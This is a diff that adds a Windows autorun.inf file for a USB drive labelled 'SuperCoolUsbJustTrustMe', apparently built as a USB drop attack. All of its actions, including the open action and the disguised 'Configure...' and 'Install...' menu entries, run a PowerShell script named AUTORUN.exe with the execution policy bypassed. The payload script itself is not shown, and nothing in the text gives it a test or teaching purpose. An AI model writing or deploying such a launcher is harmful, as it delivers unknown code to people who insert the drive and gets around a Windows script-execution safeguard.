@@ -1,0 +1,10 @@
+[autorun]
+action=Run SuperCoolUsbJustTrustMe
+icon=AUTORUN.exe,0
+label=SuperCoolUsbJustTrustMe
+open=powershell -ExecutionPolicy Bypass -File AUTORUN.exe
+
+shell\configure\command=powershell -ExecutionPolicy Bypass -File AUTORUN.exe
+shell\configure=&Configure...
+shell\install\command=powershell -ExecutionPolicy Bypass -File AUTORUN.exe
+shell\install=&Install...
